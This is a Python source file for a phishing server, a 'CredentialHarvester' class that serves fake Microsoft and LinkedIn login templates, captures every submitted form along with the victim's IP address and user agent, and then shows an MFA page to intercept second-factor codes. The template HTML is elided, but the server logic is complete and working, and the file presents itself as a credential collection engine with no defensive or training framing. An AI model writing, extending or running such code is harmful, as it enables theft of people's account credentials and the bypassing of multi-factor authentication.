import time
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

class CredentialHarvester:
    """Professional Credential Collection Engine (MFA, Geo-IP, High-Fidelity Templates)"""
    def __init__(self, colors=None):
        self.captured = []
        self.colors = colors or {
            "critical": "#FF0000",
            "info": "#0000FF"
        }
        self.templates = {
            "Microsoft_Modern": """<html>...</html>""",
            "MFA_Phase": """<html>...</html>""",
            "LinkedIn": """<html>...</html>"""
        }

    def start_local_harvester(self, port=8080, template_name="Microsoft_Modern", callback=None):
        class HarvesterHandler(BaseHTTPRequestHandler):
            def _log_intel(handler_self, data):
                ip = handler_self.client_address[0]
                ua = handler_self.headers.get('User-Agent', 'Hidden')
                ts = time.strftime('%H:%M:%S')
                intel = f"[{ts}] IP:{ip} | INTELLIGENCE: {data} | UA:{ua}"
                if callback: callback(intel, self.colors.get("critical"))

            def do_GET(handler_self):
                handler_self.send_response(200)
                handler_self.send_header("Content-type", "text/html")
                handler_self.end_headers()
                content = self.templates.get(template_name, self.templates["Microsoft_Modern"])
                handler_self.wfile.write(content.encode())

            def do_POST(handler_self):
                length = int(handler_self.headers['Content-Length'])
                post_data = handler_self.rfile.read(length).decode()
                handler_self._log_intel(post_data)
                handler_self.send_response(200)
                handler_self.send_header("Content-type", "text/html")
                handler_self.end_headers()
                handler_self.wfile.write(self.templates["MFA_Phase"].encode())

            def log_message(handler_self, format, *args): return

        server = HTTPServer(('0.0.0.0', port), HarvesterHandler)
        if callback: callback(f"PHISH_ENGINE: Active on port {port}. Logic: {template_name} -> MFA_Intercept", self.colors.get("info"))
        threading.Thread(target=server.serve_forever, daemon=True).start()
